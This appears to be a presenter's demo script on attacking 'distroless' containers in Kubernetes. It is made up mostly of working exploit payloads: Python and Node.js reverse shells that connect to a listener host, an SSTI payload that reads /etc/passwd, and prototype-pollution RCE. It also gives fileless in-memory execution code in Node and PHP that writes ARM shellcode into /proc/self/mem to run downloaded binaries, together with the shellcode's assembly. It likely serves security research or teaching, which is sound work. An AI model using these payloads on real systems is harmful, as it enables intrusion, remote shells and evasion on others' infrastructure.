# pre
Start docker & minikube
kubectl exec -it ubuntu -- bash; apt update; apt install net-tools netcat git wget python3 nano -y
cd /tmp
git clone https://github.com/nnsee/fileless-elf-exec
cd fileless-elf-exec
wget https://storage.googleapis.com/kubernetes-release/release/v1.25.3/bin/linux/arm64/kubectl

# Demo 0: What is distroless
## No sh
kubectl exec -it dless-express-pp-pod -- sh

## No binaries
kubectl exec -it dless-flask-ssti-pod -- sh
ls
command -v openssl #https://www.form3.tech/engineering/content/exploiting-distroless-images








# Demo 1: Python RCE
kubectl port-forward dless-python-rce-pod 3001:8080

## No binaries
http://localhost:3001/?cmd=ls
http://localhost:3001/?cmd=whoami
http://localhost:3001/?cmd=dd
http://localhost:3001/?cmd=which sh

## Show sh builtins
http://127.0.0.1:3001/?cmd=while read -r line; do echo $line; done</etc/passwd
http://localhost:3001/?cmd=command -v python

## Run using python
http://127.0.0.1:3001/?cmd=python -c "exec('import platform\nprint(platform.uname())')"

## Get reverse shell

### Prepare ubuntu
kubectl exec -it ubuntu -- bash
ifconfig
nc -lvnp 4444

### Rev shell
http://127.0.0.1:3001/?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.17.0.3",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/usr/bin/python","-i"]);'

## Execute binary using syscall
cd /tmp/fileless-elf-exec
python3 fee.py kubectl > /tmp/kubectl.py
python3 /tmp/kubectl.py

### Fix code
```python
# imports ...
# imports ...
pid = os.fork()
if pid == 0: #pid==0 represents the child process
# Rest of the payload inside this if
```

### In a different shell in ubuntu
kubectl exec -it ubuntu -- bash
cd /tmp/fileless-elf-exec
python3 -m http.server

### Download & execute ls.py in victim
```python
from urllib import request
kubectl = request.urlopen("http://172.17.0.3:8000/kubectl.py").read()
exec(kubectl)
```


# Demo 1.5: Python SSTI
kubectl port-forward dless-flask-ssti-pod 3002:1337

## If no sh, and not RCE but SSTI, this is still possible with raw python
http://127.0.0.1:3002/?name={{(1).__class__.__base__.__subclasses__()[216]()._module.__builtins__["open"]("/etc/passwd").read()}}










# Demo 2: Node PP
kubectl port-forward dless-express-pp-pod 3000:3000

## Reverse-shell
http://127.0.0.1:3000/?exec=1&data={"__proto__": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\"child_process\").fork(\"-e\",[\"net=require(`net`);cp=require(`child_process`);sh=cp.spawn(`/proc/self/exe`, [`-i`], {detached: true});client = new net.Socket();client.connect(4444, `172.17.0.3`, function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});//\"],{\"env\":{\"NODE_OPTIONS\":\"\"}}).toString())//"}}}

## Info
```js
os = require("os")
os.tmpdir()
os.platform();
os.release();
os.arch();
os.networkInterfaces()
```

## List folder
```js
path = require('path');
fs = require('fs');

function ls(path){
    fs.readdir(path, { withFileTypes: true }, function (err, files) {
        if (err) {
            return console.log('Unable to scan directory: ' + err);
        } 
        files.forEach(function (file) {
            console.log(file); 
        });
    });
}

ls("/")
```

## In memory execution

```js
// Imports
fs = require('fs');
path = require('path');
http = require('http');
https = require('https');
const { fork } = require('child_process');

// Code to execute a fork process taht will execute a shellcode with memfd_create
node_subp1_path = "/dev/shm/subp1.js"

// memfd_create shellcode from https://github.com/arget13/DDexec (this is the one for ARM)
var node_subp1 = `
fs = require('fs');
var data = fs.readFileSync('/proc/self/syscall', {encoding:'utf8', flag:'r'});
var mem_addr = data.split(" ")[8].trim();
var dec_offset = Number(mem_addr);
var shellcode_b64 = "gCiI0qCIqPLgDx/44AMAkSEAAcroIoDSAQAA1MgFgNIBAADUiBWA0gEAANRhAoDSKBCA0gEAANQ=";
var shellcode = Buffer.from(shellcode_b64, 'base64');
fs.open('/proc/self/mem', 'a', function(err, fd) {
    fs.write(fd, shellcode, 0, shellcode.length, dec_offset, function(err,writtenbytes){});
})
`

fs.writeFileSync(node_subp1_path, node_subp1);

// Check file was created (this step can be skipped)
function ls(path){
    fs.readdir(path, { withFileTypes: true }, function (err, files) {
        if (err) {
            return console.log('Unable to scan directory: ' + err);
        } 
        files.forEach(function (file) {
            console.log(file); 
        });
    });
}

ls("/dev/shm")

// Make a subprocess execute the memfd_create shellcode
var proc = fork(node_subp1_path, [], {"execPath": "/proc/self/exe", "argv0": "nodejs"});

console.log(`Check in /proc/${proc.pid}/fd (memfd is probably the biggest number)`);

// Find the memfd fd
function get_memfd_num(path){
    fs.readdir(path, function (err, files) {
        if (err) {
            console.log('Unable to scan directory: ' + err);
        } 
        files.forEach(function (file) {
            fs.readlink(path + "/" + file, (err, target) => {
                if (!err){
                    if (target.includes("/memfd:"))
                        console.log(path + "/" + file + " -> " + target)
                }
            });
        });
    });
}
get_memfd_num(`/proc/${proc.pid}/fd`);
memfd_file_path = "/proc/69/fd/20" // CHANGE THIS

// Download the binary to execute in the fd
var download = function(url, dest) {
  var file = fs.createWriteStream(dest);
  var request = https.get(url, function(response) {
    response.pipe(file);
    file.on('finish', function() {
        console.log("closed")
        file.close();
    });
  });
};

// CHANGE THE FD: /proc/80/fd/20
download("https://storage.googleapis.com/kubernetes-release/release/v1.25.3/bin/linux/arm64/kubectl", memfd_file_path)

// Execute the fd directly from the exec syscall
fork("", [], {"execPath": memfd_file_path, "execArgv": []})
```



# DEMO 3: PHP
docker run -it --rm cgr.dev/chainguard/php -a

## No way to execute binaries from php
```php
`ls`;
`sh`;
```

## List folders & read files

```php
function listFilesInFolder($folderPath) {
  if (is_dir($folderPath)) {
    if ($dh = opendir($folderPath)) {
      while (($file = readdir($dh)) !== false) {
        echo "filename: $file : filetype: " . filetype($folderPath . $file) . "\n";
      }
      closedir($dh);
    }
  }
}
listFilesInFolder("/");
echo file_get_contents("/etc/passwd");
```

## RCE 1

```php
# Download binary to memory
$bin_url = "https://storage.googleapis.com/kubernetes-release/release/v1.25.3/bin/linux/arm64/kubectl";
$handle = fopen($bin_url, "r");
$binary = "";
while (!feof($handle)) {
    $binary .= fread($handle, 2048);
}
fclose($handle);

# Create shellcode
$bin_size = strlen($binary);
$hex_size = pack('P', $bin_size);
$hex_size_str = bin2hex($hex_size);

$hexstr_shellcode = "802888d2a088a8f2e00f1ff8e0030091210001cae82280d2010000d4e40300aa26030010c60040f9e10306aac80580d2010000d4c81b80d2000080d2e10306aa620080d2230080d2050080d2010000d4e80780d2e10300aae20306aa000080d2010000d4420000eb2100008b81ffff54881580d2010000d4610280d2281080d2010000d4" . $hex_size_str;


# Execute binary
$cmd_array = [
    'php',
    '-a'
];

$descriptorspec = array(
    0 => array("pipe", "r"),   // stdin is a pipe that the child will read from
    1 => array("pipe", "w"),   // stdout is a pipe that the child will write to
    2 => array("pipe", "w")    // stderr is a pipe that the child will write to
);

# The only way in PHP to execute a binary without using a shell is using an array in proc_open
$process = proc_open($cmd_array,$descriptorspec,$pipes);
$status = proc_get_status($process);
$pid = $status['pid'];



# Execute shellcode in child process
$payload = "\n".'$data = file_get_contents("/proc/self/syscall"); $data_array = explode(" ", $data); $mem_addr = trim($data_array[8]); $dec_offset = hexdec($mem_addr); $shellcode = hex2bin("'.$hexstr_shellcode.'"); $fd = fopen("/proc/self/mem", "r+"); fseek($fd,$dec_offset); fwrite($fd, $shellcode); fclose($fd);'."\n\n".$binary; # 2 new lines are needed

fwrite($pipes[0], $payload);

# Check it was created
function listFilesInFolder($folderPath) {
  if (is_dir($folderPath)) {
    if ($dh = opendir($folderPath)) {
      while (($file = readdir($dh)) !== false) {
        echo "filename: $file : filetype: " . filetype($folderPath . $file) . "\n";
      }
      closedir($dh);
    }
  }
}

listFilesInFolder("/proc/$pid/fd/");


# Execute kubectl
$cmd_array_kubectl = [
    "/proc/$pid/fd/3",
    '-h'
];

$descriptorspec_kubectl = array(
    0 => array("pipe", "r"),   // stdin is a pipe that the child will read from
    1 => array("pipe", "w"),   // stdout is a pipe that the child will write to
    2 => array("pipe", "w")    // stderr is a pipe that the child will write to
);

$process2 = proc_open($cmd_array_kubectl,$descriptorspec_kubectl,$pipes_kubectl);
sleep(0.5);
echo stream_get_contents($pipes_kubectl[1]);
proc_close($process2);
```



```
To compile shellcode:

as a.s -o a.o
objcopy -O binary a.o
xxd -ps a.o | tr -d '\n'


Shellcode:

.arch armv8-a
.global _start

_start:
        movz    x0, #0x4144
        movk    x0, #0x4445, lsl #16
        str     x0, [sp, #-0x10]!
        mov     x0, sp
        eor     x1, x1, x1
        mov     x8, #0x117
        svc     #0 // memfd_create

        mov     x4, x0 //save fd for mmap

        adr     x6, filesz
        ldr     x6, [x6]
        mov     x1, x6    
        mov     x8, #0x2e
        svc     #0 // ftruncate
        
        mov     x8, #0xde
        mov     x0, #0
        mov     x1, x6
        mov     x2, #3 // RW
        mov     x3, #1 // MAP_SHARED
        mov     x5, #0
        svc     #0 // mmap

        mov     x8, #0x3f
        mov     x1, x0 // address returned by mmap
        mov     x2, x6
    
    read_more:
        mov     x0, #0
        svc     #0 // read
        subs    x2, x2, x0
        add     x1, x1, x0
        bne     read_more

        mov     x8, #0xac
        svc     #0 // getpid
        mov     x1, #0x13 // SIGSTOP
        mov     x8, #0x81
        svc     #0 // kill

    filesz:
```




## RCE 2
```php
# Download binary to memory
$bin_url = "URL CARGADOR";
$handle = fopen($bin_url, "r");
$binary = "";
while (!feof($handle)) {
    $binary .= fread($handle, 2048);
}
fclose($handle);

# Create shellcode
$bin_size = strlen($binary);
$hex_size = pack('P', $bin_size);
$hex_size_str = bin2hex($hex_size);

$hexstr_shellcode = "NUEVA SHELLCODE";


# Execute binary
$cmd_array = [
    'php',
    '-a'
];

$descriptorspec = array(
    0 => array("pipe", "r"),   // stdin is a pipe that the child will read from
    1 => array("pipe", "w"),   // stdout is a pipe that the child will write to
    2 => array("pipe", "w")    // stderr is a pipe that the child will write to
);

# The only wy in PHP to execute a binary without using a shell is using an array in proc_open
$process = proc_open($cmd_array,$descriptorspec,$pipes);
$status = proc_get_status($process);
$pid = $status['pid'];

# Execute shellcode in child process
$payload = "\n".'$data = file_get_contents("/proc/self/syscall"); $data_array = explode(" ", $data); $mem_addr = trim($data_array[8]); $dec_offset = hexdec($mem_addr); $shellcode = hex2bin("'.$hexstr_shellcode.'"); $fd = fopen("/proc/self/mem", "r+"); fseek($fd,$dec_offset); fwrite($fd, $shellcode); fclose($fd);'."\n\n".$binary; # 2 new lines are needed

fwrite($pipes[0], $payload);

# Check it was created
function listFilesInFolder($folderPath) {
  if (is_dir($folderPath)) {
    if ($dh = opendir($folderPath)) {
      while (($file = readdir($dh)) !== false) {
        echo "filename: $file : filetype: " . filetype($folderPath . $file) . "\n";
      }
      closedir($dh);
    }
  }
}

listFilesInFolder("/proc/$pid/fd/");


# TODO... usar el cargador para cargar un busybox a ser posible o sino un kubectl o cualquier cosa
```